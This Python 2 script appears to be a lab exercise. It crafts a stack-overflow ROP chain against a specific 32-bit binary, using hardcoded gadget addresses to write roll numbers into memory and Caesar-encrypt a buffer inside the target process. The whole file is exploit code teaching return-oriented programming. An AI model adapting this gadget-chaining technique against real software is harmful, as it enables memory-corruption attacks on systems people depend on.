#! /usr/bin/python2
from sys import stdout, stderr, argv

main_print_plaintext_address = 0x08049eb7

###########################################################
# I. Parse arguments to get the plaintext and string
if len(argv) > 3:
    stderr.write("Invalid arguments, please use: %s key \"SecretText\"\n" % argv[0])
    exit(1)
if len(argv) > 2:
    if not argv[2].isalnum():
        stderr.write("Cipher text should only be alphanumeric\n")
        exit(1)
    cipher_text = argv[2]
else:
    cipher_text = "ABCDEFGH"

if len(argv) > 1:
    try:
        key = int(argv[1])
    except ValueError:
        stderr.write("Invalid key, expecting an int in place of: %s\n" % argv[1])
        exit(1)
else:
    key = 2

end_of_plaintext_char = '\n'


def convert_string_to_payload(string, max_str_len, payload_len):
    payload = []
    string = string.replace("\n", " ")

    string = string.ljust(max_str_len, chr(0))
    string = string[:max_str_len] + chr(0)

    string = string.ljust(4 * payload_len, chr(0))
    string = string[:4 * payload_len - 1] + chr(0)
    for i in range(payload_len):
        frag = string[4 * i: 4 * (i + 1)]
        word = 0x0
        for j in range(4):
            word <<= 8
            word += ord(frag[-(j + 1)])
        payload.append(word)
    return payload


###########################################################
# II. Create the exploit string

# # Useful Gadgets
# Used memory locations
plaintext = 0x80e6ce0  # Address
pointer_addr = plaintext - 4
offset_addr = plaintext - 8
filled_mask_addr = plaintext - 12
roll_num_1_addr = 0x080e5068
roll_num_2_addr = 0x080e5070
format_str = 0x80b40a4  # Address

# Gadgets to set register values
pop_eax = 0x080b054a  # pop eax; ret
pop_ebx = 0x080b2643  # pop ebx; ret;
pop_ecx_clobber_eax = 0x080640c1  # pop ecx; add al, 0xf6; ret;
pop_edx_ebx = 0x0805ebf9  # pop edx; pop ebx; ret;
pop_ebp = 0x08049859  # pop ebp; ret;

# Gadgets to move and exchange between registers
mov_edx_eax = 0x08098db8  # # mov ecx, eax; mov eax, ecx; ret;
mov_ecx_eax = 0x08098db8  # mov ecx, eax; mov eax, ecx; ret;
xchg_eax_edx = 0x08074696  # xchg eax, edx; ret;
xchg_eax_ebp = 0x08062abe  # xchg ebp, eax ; ret

# Gadgets to read from memory
mov_eax_peax = 0x0805fc44  # mov eax, dword ptr [eax]; ret;
xlatb = 0x0806c646  # xlatb; ret;  # mov al, BYTE PTR [ebx + al]

# Gadgets to write to memory
fancy_dw_ebx_ecx = 0x08096c57  # mov dword ptr [ebx], ecx; add esp, 4; pop ebx; pop esi; ret;
move_bp_edx_al_clobber_eax = 0x0806dac2  # mov byte ptr [edx], al; mov eax, edx; ret;
# dw_eax_edx = 0x080a36c8  # mov dword ptr [eax], edx; ret;

# Single Operand Arithmetic
inc_eax = 0x08088a9e  # inc eax; ret;
dec_eax = 0x0806c0e3  # dec eax; ret;
neg_eax = 0x0805cdbb  # neg eax; ret;
xor_eax_eax = 0x0804fc70  # xor eax, eax ; ret
inc_ecx = 0x0807c165  # inc ecx; ret;
double_ecx = 0x08049d37  # add ecx, ecx; ret;

# Add and Subtract
eax_pe_edx = 0x08071393  # add eax, edx; ret;
add_eax_edx = 0x08071393  # add eax, edx ; ret

sub_eax_ecx = 0x08069d78  # sub eax, ecx; ret;
sub_eax_edx = 0x0805f980  # sub eax, edx; ret;

# Gadget used to load the carry flag
load_cl_CF = 0x08049ca4  # adc cl, cl; ret;

# Gadget used to pertube the ESP
the_esp_op = 0x0809c3c1  # add esp, dword ptr [ebx + eax*4]; ret;

# Nop
nop = 0x08049caf  # nop; ret;

# # The Payload

first_line = "%s\n" % cipher_text

# To fill the stack to the return address.
# It is also used to write a userfriendly string to STDOUT
dummy = convert_string_to_payload("Key: %d" % key, 9, 6)

code = [

    # Set the roll numbers correctly
    pop_ebx,
    roll_num_2_addr,
    pop_ecx_clobber_eax,
    ord('M') + (ord('E') << 8) + (ord('1') << 16) + (ord('9') << 24),
    fancy_dw_ebx_ecx,
    0x0,
    roll_num_2_addr + 4,
    0x0,
    pop_ecx_clobber_eax,
    ord('B') + (ord('1') << 8) + (ord('7') << 16) + (ord('7') << 24),
    fancy_dw_ebx_ecx,
    0x0,
    roll_num_1_addr,
    0x0,

    pop_ecx_clobber_eax,
    ord('E') + (ord('E') << 8) + (ord('1') << 16) + (ord('8') << 24),
    fancy_dw_ebx_ecx,
    0x0,
    roll_num_1_addr + 4,
    0x0,
    pop_ecx_clobber_eax,
    ord('1') + (ord('1') << 8) + (ord('0') << 16) + (0 << 24),
    fancy_dw_ebx_ecx,
    0x0,
    0,
    0x0,

    # Initialize the pointer to the start of plaintext
    # *pointer_addr = plaintext
    pop_ecx_clobber_eax,
    plaintext,
    pop_ebx,
    pointer_addr,
    fancy_dw_ebx_ecx,
    0x0,
    0,
    0x0,

    # Initialize the pointer to the start of plaintext
    # *pointer_addr = plaintext
    pop_ecx_clobber_eax,
    plaintext,
    pop_ebx,
    pointer_addr,
    fancy_dw_ebx_ecx,
    0x0,
    0,
    0x0,

    # Initialize the filled mask
    # *filled_mask_addr = 0xFFFFFFFF
    pop_ecx_clobber_eax,
    0xFFFFFFFF,
    pop_ebx,
    filled_mask_addr,
    fancy_dw_ebx_ecx,
    0x0,
    0,
    0x0,

    # nops for padding the "jumps".
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,

    # # Start of Loop
    # ecx = 0  # for the load_cl_CF instruction
    pop_eax,
    0x0,
    mov_ecx_eax,

    # We want the condition break if char <= '\n'
    # i.e. CF is set if we do sub char - '\n'
    # Load the '\n'

    # Load the current character
    # al = **pointer_addr
    pop_edx_ebx,
    plaintext,
    plaintext,
    pop_eax,
    pointer_addr,
    mov_eax_peax,
    sub_eax_edx,
    xlatb,
    nop,

    # edx = end_of_plaintext_char + 1 and eax = eax
    xchg_eax_edx,
    pop_eax,
    ord(end_of_plaintext_char) + 1,
    xchg_eax_edx,

    # cl = 1 if **pointer_addr <= char to bk
    sub_eax_edx,
    load_cl_CF,

    # ecx *= number of instructions to skip in the set `code`
    double_ecx,
    double_ecx,
    double_ecx,
    double_ecx,
    double_ecx,
    double_ecx,

    # ecx *= 4
    # i.e. ecx is the offset for esp
    # Into 4 for bytes
    double_ecx,
    double_ecx,

    # ebx = offset_addr
    pop_ebx,
    offset_addr,

    # *offset_addr = ecx = offset
    # ebx = offset_addr
    fancy_dw_ebx_ecx,
    0x0,
    offset_addr,
    0x0,

    # eax = 0
    pop_eax,
    0x0,

    # esp += [ebx + 4 * eax] => esp += *offset_addr
    the_esp_op,

    # Load Element
    # al = **pointer_addr
    pop_edx_ebx,
    plaintext,
    plaintext,
    pop_eax,
    pointer_addr,
    mov_eax_peax,
    sub_eax_edx,
    xlatb,

    ####################
    # Cipher code start:

    0x0805ebf9,  # pop edx ; pop ebx ; ret
    (0xFFFFFFFF - ord('A') + 1) + key,  # edx <- -A + key (two's complement)
    26 << 8,  # bh <- 26

    add_eax_edx,

    0x08090b7b,  # idiv bh ; dec dword ptr [edi] ; xchg ebp, eax ; ret
    xchg_eax_ebp,

    pop_edx_ebx,
    ord('A') << 8,  # A in dh
    filled_mask_addr,  # ebx

    0x08049c55,  # add ah, dh ; mov ebx, dword ptr [esp] ; ret
    xchg_eax_edx,

    # eax = encrypted char
    xor_eax_eax,
    0x08071385,  # adc al, dh ; ret

    # Cipher Code End
    ####################

    # edx = *pointer_addr and eax = eax
    xchg_eax_edx,
    pop_eax,
    pointer_addr,
    mov_eax_peax,
    xchg_eax_edx,

    # *pointer = [edx] = al = encrypted_char
    move_bp_edx_al_clobber_eax,

    # *pointer_addr++
    pop_eax,
    pointer_addr,
    mov_eax_peax,
    inc_eax,
    mov_ecx_eax,
    pop_ebx,
    pointer_addr,
    fancy_dw_ebx_ecx,
    0x0,
    offset_addr,
    0x0,
    nop,

    # *offset_addr = [ebx] = ecx = offset
    pop_ecx_clobber_eax,
    0xFFFFFFFF - (75 + 13) * 4 + 1,
    pop_ebx,
    offset_addr,
    fancy_dw_ebx_ecx,
    0x0,
    offset_addr,
    0x0,

    # eax = 0
    pop_eax,
    0x0,

    # esp += [ebx + 4 * eax] => esp += *offset_addr
    the_esp_op,

    # nops for padding the "jumps".
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
    nop,
]

# Reset some registers to the value they had when concatenate_first_chars was called, so main can execute
return_seq = [
    pop_ecx_clobber_eax,
    0xffffd030,

    pop_edx_ebx,
    0xffffd080,
    0x080e5000,

    pop_ebp,
    0xffffd018,

    main_print_plaintext_address,
]

payload = dummy + code + return_seq

###########################################################
# III. Write the generated strings in the right pattern

stdout.write(first_line)  # To be read into `plaintext`

#            &i   - &buffer
len_buffer = 0x28 - 0x1c

# Write our required return address and data to the stack
byte_mask = (0b1 << 8) - 1
i = 0
for word in payload:
    assert (word >> 32) == 0  # 4 byte address
    for j in range(4):
        byte = word & byte_mask
        if byte == ord("\n"):
            stderr.write("Cannot write 0x0a to the stack (i.e. a newline), change value number %d" % i)
        if not (i == len(payload) - 1 and j == 3):  # not the last byte in the payload
            stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x00\x00\x00")  # Set i = 0
        else:
            stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x09\x00\x00")  # Set i = 9 so the loop will exit
        word >>= 8
    i += 1

stdout.flush()
